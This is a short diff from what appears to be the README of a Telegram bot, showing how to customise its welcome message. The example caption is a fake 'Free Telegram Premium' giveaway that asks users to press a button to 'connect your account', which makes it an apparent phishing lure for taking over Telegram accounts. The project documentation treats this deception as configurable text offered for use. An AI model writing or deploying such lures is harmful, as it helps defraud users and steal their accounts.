@@ -111,10 +111,6 @@ To configure the bot's appearance and functionality:
    - Edit the strings in the `send_welcome()` function to update the welcome message and other text.
 
    Example:   ```python
-        # Send welcome message with a picture and both buttons
-        with open('telegramicon.png', 'rb') as photo:
-            sent_message = update.message.reply_photo(
-                photo=photo,
                 caption=("🎉 Welcome to Free Telegram Premium 🎉\n\n"
                          "You can get 3 months of Telegram Premium for free!\n\n"
                          "To Get ⭐Free Premium Telegram ⭐ Access\n\n please press the box icon button \n\nnear the clip 🧷\n\n below to connect your account to Telegram Pro. 📱\n\n"
